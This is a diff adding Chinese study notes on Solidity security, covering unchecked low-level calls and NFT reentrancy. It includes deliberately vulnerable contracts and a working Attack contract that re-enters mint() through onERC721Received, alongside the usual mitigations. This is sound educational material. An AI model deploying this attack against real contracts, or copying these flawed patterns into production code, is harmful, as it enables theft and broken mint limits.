@@ -3136,8 +3136,87 @@ import '@openzeppelin/contracts/access/Ownable.sol';
 ### 2024.10.16
 
 - [104-S13] 未检查的低级调用
+    - 失败的低级调用不会让交易回滚，如果合约中忘记对其返回值进行检查，往往会出现严重的问题。以太坊的低级调用包括 call()，delegatecall()，staticcall()，和send()。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 false ，传递调用失败的信息。如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。
+    - 最容易出错的是send()：一些合约使用 send() 发送 ETH，但是 send() 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 send() 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。 [example](https://www.kingoftheether.com/postmortem.html)
+    ```solidity
+    contract UncheckedBank {
+        mapping (address => uint256) public balanceOf;
+
+        function deposit() external payable {
+            balanceOf[msg.sender] += msg.value;
+        }
+
+        function withdraw() external {
+            uint256 balance = balanceOf[msg.sender];
+            require(balance > 0, "Insufficient balance");
+            balanceOf[msg.sender] = 0;
+            // Unchecked low-level call
+            bool success = payable(msg.sender).send(balance); // 这个函数没有检查 send() 的返回值，提款失败但余额会清零
+        }
+
+        function getBalance() external view returns (uint256) {
+            return address(this).balance;
+        }
+    }
+    ```
+    - 使用以下几种方法来预防未检查低级调用的漏洞:
+        - 检查低级调用的返回值；
+        - 使用OpenZeppelin的[Address](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol)库，封装了低级调用检查返回值功能；
 - [104-S14] 操纵区块时间
 - [104-S15] 操纵预言机
 - [104-S16] NFT重入攻击
+    - 转账NFT时并不会触发合约的fallback或receive函数，为什么会有重入风险呢？这是因为NFT标准（ERC721/ERC1155）为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。例如 ERC721 的 safeTransferFrom() 函数会调用目标地址的 onERC721Received() 函数，而黑客可以把恶意代码嵌入其中进行攻击。
+    - 漏洞：
+        - ERC721
+            - safeTransferFrom
+            - _safeTransfer
+            - _safeMint
+            - _checkOnERC721Received
+        - ERC1155
+            - safeTransferFrom
+            - _safeTransferFrom
+            - safeBatchTransferFrom
+            - _safeBatchTransferFrom
+            - _mint
+            - _mintBatch
+            - _doSafeTransferAcceptanceCheck
+            - _doSafeBatchTransferAcceptanceCheck
+    - 漏洞例子：ERC721合约，每个地址可以免费铸造一个NFT，但是我们通过重入攻击可以一次铸造多个。
+    ```solidity
+    contract NFTReentrancy is ERC721 {
+        uint256 public totalSupply;
+        mapping(address => bool) public mintedAddress;
+        constructor() ERC721("Reentry NFT", "ReNFT"){}
+
+        // 铸造函数，每个用户只能铸造1个NFT
+        function mint() payable external {
+            require(mintedAddress[msg.sender] == false);
+            totalSupply++;
+            _safeMint(msg.sender, totalSupply); // 有重入漏洞
+            mintedAddress[msg.sender] = true;
+        }
+    }
+
+    contract Attack is IERC721Receiver{
+        NFTReentrancy public nft;
+
+        constructor(NFTReentrancy _nftAddr) {
+            nft = _nftAddr;
+        }
+        
+        function attack() external {
+            nft.mint();
+        }
+
+        // ERC721的回调函数，会重复调用mint函数，铸造10个
+        function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
+            if(nft.balanceOf(address(this)) < 10){
+                nft.mint();
+            }
+            return this.onERC721Received.selector;
+        }
+    }
+    ```
+    - 解决方法：检查-影响-交互模式（checks-effect-interaction）和重入锁 [ReentrancyGuard.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)
 - [104-S17] “跨服”重入攻击
 
